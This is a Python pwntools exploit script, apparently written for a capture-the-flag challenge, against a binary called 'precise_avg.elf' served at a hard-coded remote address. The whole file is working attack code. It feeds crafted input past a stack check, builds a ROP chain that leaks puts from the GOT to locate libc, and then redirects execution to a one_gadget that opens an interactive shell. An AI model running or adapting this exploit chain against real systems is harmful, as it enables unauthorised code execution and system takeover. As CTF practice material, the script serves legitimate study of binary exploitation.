#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('precise_avg.elf')

host = args.HOST or '82.196.10.106'
port = int(args.PORT or 12499)

env={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env,gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env,*a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x400958
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()
io.clean()
io.sendline('39')
for i in range(33):
    io.sendline('0')
io.sendline('+')

def get_val(x):
    p=process('./convert')
    p.send(x)
    data=p.recvuntil('go')
    data=p.recv()
    data=data.strip()
    return data

io.sendline('123')
rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.call(0x4007D0)
data=rop.chain()
data=[data[i:i+8] for i in range(0,len(data),8)]
for x in data:
    k = get_val(x)
    io.sendline(k)

io.recvuntil('Result')
io.recvline()

libc=ELF('./libc6_2.27-3ubuntu1_amd64.so')
addr = unpack(io.recvline().strip() + "\x00\x00")-libc.symbols['puts']
log.info(hex(addr))

one_gadget = addr + 0x10a38c

from time import sleep
sleep(2)

io.recv()
io.sendline('36')
for i in range(33):
    io.sendline('0')
io.sendline('+')
io.sendline('123')

x=get_val(p64(one_gadget))
io.sendline(x)


io.interactive()

